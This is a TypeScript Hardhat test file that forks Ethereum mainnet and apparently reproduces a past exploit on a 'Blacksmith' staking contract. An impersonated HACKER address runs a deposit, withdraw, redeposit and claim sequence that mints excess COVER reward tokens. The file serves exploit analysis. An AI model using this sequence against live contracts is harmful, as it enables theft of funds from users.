import { Blacksmith } from "../typechain-types";
import { loadFixture, ethers, expect, time, reset } from "./setup";

import { Contract } from "ethers";

import balanceABI from "./BalancerPool.json";

const rpcUrl =
	"https://eth-mainnet.g.alchemy.com/v2/" + process.env.ALCHEMY_KEY;

const HACKER = "0x00007569643bc1709561ec2E86F385Df3759e5DD";

async function addPool(blacksmith: Blacksmith, pool: string) {
	const deployer = await ethers.getImpersonatedSigner(
		"0x2f80E5163A7A774038753593010173322eA6f9fe"
	);

	const executionData = blacksmith.interface.encodeFunctionData("addPools", [
		["0xcB8eC8236AFF8e112517F4e9a9ffB413A237e6b7", pool],
		[0n, 0n],
	]);

	const multiSigCallData = {
		to: {
			type: "address",
			value: blacksmith.target.toString(),
		},
		value: {
			type: "uint256",
			value: 0n,
		},
		data: {
			type: "bytes",
			value: executionData,
		},
		operation: {
			type: "uint8",
			value: 0,
		},
		safeTxGas: {
			type: "uint256",
			value: 116443n,
		},
		baseGas: {
			type: "uint256",
			value: 0n,
		},
		gasPrice: {
			type: "uint256",
			value: 0n,
		},
		gasToken: {
			type: "address",
			value: ethers.ZeroAddress,
		},
		refundReceiver: {
			type: "address",
			value: ethers.ZeroAddress,
		},
		signatures: {
			type: "bytes",
			value: "0x0000000000000000000000002f80e5163a7a774038753593010173322ea6f9fe000000000000000000000000000000000000000000000000000000000000000001e8bbe55414f3b718eb1e426e31e03b154406f5c6376ae36219ce108e0a97680179b37f0c9624ea91ca766b5da4009300e455bbb01b5282a0847488481b486bb41b",
		},
	};

	const multiSigCallDataEncoded =
		"0x6a761202" +
		ethers.AbiCoder.defaultAbiCoder()
			.encode(
				Object.values(multiSigCallData).map((value) => value.type),
				Object.values(multiSigCallData).map((value) => value.value)
			)
			.slice(2);

	const addPoolsTx = await deployer.sendTransaction({
		to: "0x15957f0CA310d35b2E73fB5070Ce44A5B0141AB1", // multisig,
		value: 0n,
		data: multiSigCallDataEncoded,
	});

	await addPoolsTx.wait();
}

async function depositToPoll(
	blacksmith: Blacksmith,
	pool: Contract,
	amount: bigint
) {
	return await blacksmith.deposit(pool.target, amount);
}

async function withdrawFromPoll(
	blacksmith: Blacksmith,
	pool: Contract,
	amount: bigint
) {
	return await blacksmith.withdraw(pool.target, amount);
}

async function claim(blacksmith: Blacksmith, pool: Contract) {
	return await blacksmith.claimRewards(pool.target);
}

describe("Blacksmith", () => {
	const getBlacksmith = async () => {
		return await ethers.getContractAt(
			"Blacksmith",
			"0xE0B94a7BB45dD905c79bB1992C9879f40F1CAeD5"
		);
	};

	const targetPool = "0x59686E01Aa841f622a43688153062C2f24F8fDed";

	it("addPools()", async () => {
        await reset(rpcUrl, 11542278);
		const blacksmith = await getBlacksmith();
		console.log(await blacksmith.pools(targetPool));
        console.log(await blacksmith.miners(targetPool, HACKER));
	});

	it("test", async () => {
		await reset(rpcUrl, 11542278);

		const hacker = await ethers.getImpersonatedSigner(HACKER);
		const blacksmith = (await getBlacksmith()).connect(hacker);
        const coverTarget = await blacksmith.cover();
		const coverToken = await ethers.getContractAt("IERC20", coverTarget);

        const pool = new ethers.Contract(
			targetPool,
			balanceABI,
			ethers.provider
		);

        const remainingBalance = await pool.balanceOf(blacksmith.target);
		console.log(remainingBalance);

        console.log("BEFORE")
        console.log(await blacksmith.pools(targetPool));
        console.log(await blacksmith.miners(targetPool, HACKER));
        console.log("=========");

		// await time.setNextBlockTimestamp(1609156487);
		await depositToPoll(blacksmith, pool, 15255552810089260015362n);

        console.log("AFTER 1ST DEPOSIT")
        console.log(await blacksmith.pools(targetPool));
        console.log(await blacksmith.miners(targetPool, HACKER));
        console.log("=========");

		const opponent = await ethers.getImpersonatedSigner(
			"0xDF1AeFb979d180b4d67CCA9Abb4c5108C89dC8A4"
		);
		await blacksmith
			.connect(opponent)
			.withdraw(pool.target, remainingBalance);

        console.log("AFTER OPPONENT WITHDRAW")
        console.log(await blacksmith.pools(targetPool));
        console.log(await blacksmith.miners(targetPool, HACKER));
        console.log("=========");

		// await time.setNextBlockTimestamp(1609156684);
		await withdrawFromPoll(blacksmith, pool, 15255552810089260015361n);

        console.log("AFTER WITHDRAW")
        console.log(await blacksmith.pools(targetPool));
        console.log(await blacksmith.miners(targetPool, HACKER));
        console.log("=========");

		// await time.setNextBlockTimestamp(1609156821);
		await depositToPoll(blacksmith, pool, 15255552810089260015361n);

        console.log("AFTER 2ND DEPOSIT")
        console.log(await blacksmith.pools(targetPool));
        console.log(await blacksmith.miners(targetPool, HACKER));
        console.log("=========");

		const oldBalance = await coverToken.balanceOf(HACKER);

		// await time.setNextBlockTimestamp(1609156924);
		await claim(blacksmith, pool);

        console.log("AFTER CLAIM")
        console.log(await blacksmith.pools(targetPool));
        console.log(await blacksmith.miners(targetPool, HACKER));
        console.log("=========");

		const newBalance = await coverToken.balanceOf(HACKER);

		console.log("COVER MINTED:", newBalance - oldBalance);
	});
});
